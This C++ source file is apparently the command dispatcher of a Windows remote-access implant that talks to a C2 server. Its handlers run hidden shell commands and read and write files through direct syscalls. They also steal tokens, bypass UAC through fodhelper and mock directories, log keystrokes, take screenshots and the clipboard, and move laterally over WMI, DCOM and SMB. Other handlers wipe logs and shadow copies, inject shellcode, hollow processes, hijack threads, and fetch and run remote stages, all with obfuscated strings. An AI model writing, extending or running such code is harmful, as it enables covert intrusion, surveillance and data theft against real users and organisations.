#include "Runner.h"
#include "core/Base64.h"
#include "core/Protocol.h"
#include "Clipboard.h"
#include "Keylogger.h"
#include "Lateral.h"
#include "Screenshot.h"
#include "Tokens.h"
#include "UacBypass.h"
#include "evasive/Inject.h"
#include "evasive/NtTypes.h"
#include "evasive/Strings.h"
#include "evasive/Syscalls.h"
#include "forensics/AntiForensics.h"
#include "stage/Stage.h"

#include <windows.h>
#include <bcrypt.h>

#include <cstdio>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

namespace runner {

namespace {

std::wstring widen(const std::string& s) {
    if (s.empty()) return {};
    int n = MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()),
                                nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), static_cast<int>(s.size()),
                        w.data(), n);
    return w;
}

std::string run_shell(const std::vector<std::string>& args) {
    std::string line;
    for (std::size_t i = 0; i < args.size(); ++i) {
        if (i) line += ' ';
        if (args[i].find(' ') != std::string::npos) {
            line += '"'; line += args[i]; line += '"';
        } else {
            line += args[i];
        }
    }
    if (line.empty()) return "(no command)";

    auto cmd_pfx = OBF_KEEP("cmd.exe /c ");
    std::wstring cmd;
    for (std::size_t i = 0; i < cmd_pfx.size(); ++i)
        cmd.push_back(static_cast<wchar_t>(static_cast<unsigned char>(cmd_pfx.c_str()[i])));
    cmd += widen(line);

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "error: CreatePipe";
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    PROCESS_INFORMATION pi{};

    std::wstring mut = cmd; // CreateProcessW may write the buffer
    BOOL ok = CreateProcessW(nullptr, mut.data(), nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (!ok) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return "error: CreateProcess " + std::to_string(GetLastError());
    }
    CloseHandle(hWrite);

    std::string out;
    char buf[4096];
    DWORD got = 0;
    while (ReadFile(hRead, buf, sizeof(buf), &got, nullptr) && got > 0) {
        out.append(buf, got);
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hRead);

    if (out.empty()) return "(no output)";
    while (!out.empty() && (out.back() == '\r' || out.back() == '\n' || out.back() == ' '))
        out.pop_back();
    return out;
}

std::string run_download(const std::vector<std::string>& args) {
    if (args.empty()) return "error: download needs a path";
    std::wstring nt_path = L"\\??\\" + widen(args[0]);

    nt::UnicodeString* us = nt::make_unicode(nt_path.c_str());
    if (!us) return "error: alloc unicode";
    nt::ObjectAttributes oa;
    nt::init_object(oa, us);

    constexpr std::uint32_t FILE_GENERIC_READx = 0x00120089; // SYNCHRONIZE included
    constexpr std::uint32_t FILE_OPENif = 1;                 // FILE_OPEN
    constexpr std::uint32_t FILE_NON_DIR = 0x00000040;
    constexpr std::uint32_t SYNC_NONALERT = 0x00000020;

    void* hFile = nullptr;
    nt::IoStatusBlock iosb{};
    NTSTATUS s = syscalls::ScCreateFile(&hFile, FILE_GENERIC_READx,
        &oa, &iosb, nullptr, 0, 0x00000007 /*FILE_SHARE_READ|WRITE|DELETE*/,
        FILE_OPENif, FILE_NON_DIR | SYNC_NONALERT, nullptr, 0);
    if (s < 0 || !hFile) {
        return "error: open 0x" + std::to_string(static_cast<unsigned long>(s));
    }

    std::vector<std::uint8_t> data;
    std::uint8_t chunk[65536];
    for (;;) {
        nt::IoStatusBlock ios{};
        // nullptr ByteOffset => current file position.
        s = syscalls::ScReadFile(hFile, nullptr, nullptr, nullptr, &ios, chunk,
                                 sizeof(chunk), nullptr, nullptr);
        if (s < 0) break;
        std::size_t n = ios.Information;
        if (n == 0) break;
        data.insert(data.end(), chunk, chunk + n);
        if (n < sizeof(chunk)) break;
    }
    syscalls::ScClose(hFile);

    return b64::encode(data.data(), data.size());
}

std::string run_upload(const std::vector<std::string>& args) {
    if (args.size() < 2) return "error: upload needs <remote> <b64>";
    bool ok = false;
    std::string raw = b64::decode(args[1], &ok);
    if (!ok) return "error: bad base64";

    std::wstring nt_path = L"\\??\\" + widen(args[0]);
    nt::UnicodeString* us = nt::make_unicode(nt_path.c_str());
    if (!us) return "error: alloc unicode";
    nt::ObjectAttributes oa;
    nt::init_object(oa, us);

    constexpr std::uint32_t FILE_GENERIC_WRITEx = 0x00120116;
    constexpr std::uint32_t FILE_OVERWRITE_IF = 5;
    constexpr std::uint32_t FILE_NON_DIR = 0x00000040;
    constexpr std::uint32_t SYNC_NONALERT = 0x00000020;

    void* hFile = nullptr;
    nt::IoStatusBlock iosb{};
    NTSTATUS s = syscalls::ScCreateFile(&hFile, FILE_GENERIC_WRITEx,
        &oa, &iosb, nullptr, 0x00000080 /*FILE_ATTRIBUTE_NORMAL*/,
        0x00000007, FILE_OVERWRITE_IF, FILE_NON_DIR | SYNC_NONALERT, nullptr, 0);
    if (s < 0 || !hFile) {
        return "error: create 0x" + std::to_string(static_cast<unsigned long>(s));
    }

    nt::IoStatusBlock ios{};
    s = syscalls::ScWriteFile(hFile, nullptr, nullptr, nullptr, &ios,
        const_cast<char*>(raw.data()), static_cast<std::uint32_t>(raw.size()),
        nullptr, nullptr);
    syscalls::ScClose(hFile);
    if (s < 0) {
        return "error: write 0x" + std::to_string(static_cast<unsigned long>(s));
    }
    return "wrote " + std::to_string(raw.size()) + " bytes -> " + args[0];
}

} // namespace

bool dispatch(std::string_view agent_id, const std::string& cmd,
              const std::vector<std::string>& args, std::string& result,
              std::uint32_t& interval, std::uint8_t key[32]) {
    if (cmd == "SHELL") {
        result = run_shell(args);
        return false;
    }
    if (cmd == "DOWNLOAD") {
        result = run_download(args);
        return false;
    }
    if (cmd == "UPLOAD") {
        result = run_upload(args);
        return false;
    }
    if (cmd == "SLEEP") {
        if (!args.empty()) {
            try {
                unsigned long sec = std::stoul(args[0]);
                interval = static_cast<std::uint32_t>(sec);
                result = "sleep set to " + std::to_string(interval) + "s";
            } catch (...) {
                result = "error: invalid sleep value";
            }
        } else {
            result = "error: sleep needs seconds";
        }
        return false;
    }
    if (cmd == "EXIT") {
        result = "exiting";
        return true;
    }
    if (cmd == "WHOAMI") {
        result = tokens::whoami();
        return false;
    }
    if (cmd == "STEAL_TOKEN") {
        if (args.empty()) { result = "error: STEAL_TOKEN <pid>"; return false; }
        try {
            result = tokens::steal_from_process(static_cast<std::uint32_t>(std::stoul(args[0])));
        } catch (...) { result = "error: bad pid"; }
        return false;
    }
    if (cmd == "UAC_FODHELPER") {
        result = uac::fodhelper_bypass();
        return false;
    }
    if (cmd == "UAC_MOCKDIR") {
        result = uac::mockdir_bypass();
        return false;
    }
    if (cmd == "KEYLOG") {
        std::uint32_t sec = 30;
        if (!args.empty()) {
            try { sec = static_cast<std::uint32_t>(std::stoul(args[0])); } catch (...) {}
        }
        result = keylog::capture(sec);
        return false;
    }
    if (cmd == "SCREENSHOT") {
        result = shot::capture();
        return false;
    }
    if (cmd == "CLIPBOARD") {
        result = clip::get_text();
        return false;
    }
    if (cmd == "SMB_CHECK") {
        if (args.size() < 2) { result = "error: SMB_CHECK <target> <share>"; return false; }
        result = lateral::smb_check(args[0], args[1]);
        return false;
    }
    if (cmd == "WMI_EXEC") {
        if (args.size() < 2) { result = "error: WMI_EXEC <target> <command>"; return false; }
        std::string cmdline = args[1];
        for (std::size_t i = 2; i < args.size(); ++i) {
            cmdline += ' ';
            cmdline += args[i];
        }
        result = lateral::wmi_exec(args[0], cmdline);
        return false;
    }
    if (cmd == "DCOM_TRIGGER") {
        if (args.empty()) { result = "error: DCOM_TRIGGER <target>"; return false; }
        result = lateral::dcom_trigger(args[0]);
        return false;
    }
    if (cmd == "ANTIFORENSICS") {
        bool clear = true, vss = false;
        if (!args.empty()) {
            for (const auto& a : args) {
                if (a == "--vss") vss = true;
                if (a == "--no-logs") clear = false;
            }
        }
        result = forensics::run(clear, vss);
        return false;
    }
    if (cmd == "REMOTE_INJECT") {
        if (args.empty()) { result = "error: REMOTE_INJECT <pid>"; return false; }
        try {
            std::uint32_t pid = static_cast<std::uint32_t>(std::stoul(args[0]));
            HMODULE k = GetModuleHandleA("kernel32.dll");
            if (!k) { result = "error: kernel32"; return false; }
            auto exit_thread = reinterpret_cast<void*>(GetProcAddress(k, "ExitThread"));
            if (!exit_thread) { result = "error: ExitThread"; return false; }
            std::uint8_t sc[32] = {0};
            sc[0] = 0x48; sc[1] = 0xC7; sc[2] = 0xC1;
            sc[7] = 0x48; sc[8] = 0xB8;
            std::memcpy(sc + 9, &exit_thread, 8);
            sc[17] = 0x48; sc[18] = 0xFF; sc[19] = 0xE0;
            result = inject::remote_map(pid, sc, 20);
        } catch (...) { result = "error: bad pid"; }
        return false;
    }
    if (cmd == "HOLLOW") {
        if (args.size() < 2) {
            result = "error: HOLLOW <host_path> <b64_pe>";
            return false;
        }
        bool ok = false;
        std::string pe = b64::decode(args[1], &ok);
        if (!ok || pe.empty()) { result = "error: bad pe b64"; return false; }
        result = inject::hollowing(reinterpret_cast<const std::uint8_t*>(pe.data()),
                                   pe.size(), widen(args[0]).c_str());
        return false;
    }
    if (cmd == "HIJACK_THREAD") {
        if (args.size() < 2) {
            result = "error: HIJACK_THREAD <pid> <b64_payload>";
            return false;
        }
        try {
            std::uint32_t pid = static_cast<std::uint32_t>(std::stoul(args[0]));
            bool ok = false;
            std::string payload = b64::decode(args[1], &ok);
            if (!ok || payload.empty()) { result = "error: bad payload b64"; return false; }
            result = inject::hijack_thread(pid,
                reinterpret_cast<const std::uint8_t*>(payload.data()), payload.size());
        } catch (...) { result = "error: bad pid"; }
        return false;
    }
    if (cmd == "ROTATE_KEY") {
        std::uint8_t new_key[32] = {0};
        if (proto::rotate_key(agent_id, key, new_key)) {
            std::memcpy(key, new_key, 32);
            result = "key rotated";
        } else {
            result = "error: rotate failed";
        }
        return false;
    }
    if (cmd == "STAGE") {
        if (args.empty()) {
            result = "error: STAGE <url> [hex_key]";
            return false;
        }
        std::uint8_t sk[32] = {0};
        if (args.size() >= 2 && args[1].size() == 64) {
            auto hb = [](char c) -> int {
                if (c >= '0' && c <= '9') return c - '0';
                if (c >= 'a' && c <= 'f') return c - 'a' + 10;
                if (c >= 'A' && c <= 'F') return c - 'A' + 10;
                return -1;
            };
            bool ok = true;
            for (int i = 0; i < 32; ++i) {
                int hi = hb(args[1][i * 2]), lo = hb(args[1][i * 2 + 1]);
                if (hi < 0 || lo < 0) { ok = false; break; }
                sk[i] = static_cast<std::uint8_t>((hi << 4) | lo);
            }
            if (!ok) { result = "error: bad hex key"; return false; }
        } else {
            // Default: SHA256("C2_STAGE_KEY_32_BYTES_LONG_XXXX") — must match server.
            BCRYPT_ALG_HANDLE h = nullptr;
            if (BCryptOpenAlgorithmProvider(&h, BCRYPT_SHA256_ALGORITHM, nullptr, 0) < 0) {
                result = "error: sha256";
                return false;
            }
            BCRYPT_HASH_HANDLE hh = nullptr;
            UCHAR hash[32] = {};
            DWORD cb = 0;
            auto mat = OBF_KEEP("C2_STAGE_KEY_32_BYTES_LONG_XXXX");
            bool ok = BCryptCreateHash(h, &hh, nullptr, 0, nullptr, 0, 0) >= 0
                && BCryptHashData(hh, (PUCHAR)mat.c_str(), 32, 0) >= 0
                && BCryptFinishHash(hh, hash, 32, 0) >= 0;
            if (hh) BCryptDestroyHash(hh);
            BCryptCloseAlgorithmProvider(h, 0);
            if (!ok) { result = "error: stage key hash"; return false; }
            std::memcpy(sk, hash, 32);
        }
        if (stage::load_and_run(args[0], sk))
            result = "stage loaded";
        else
            result = "error: stage load failed";
        return false;
    }
    result = "unknown command: " + cmd;
    return false;
}

} // namespace runner
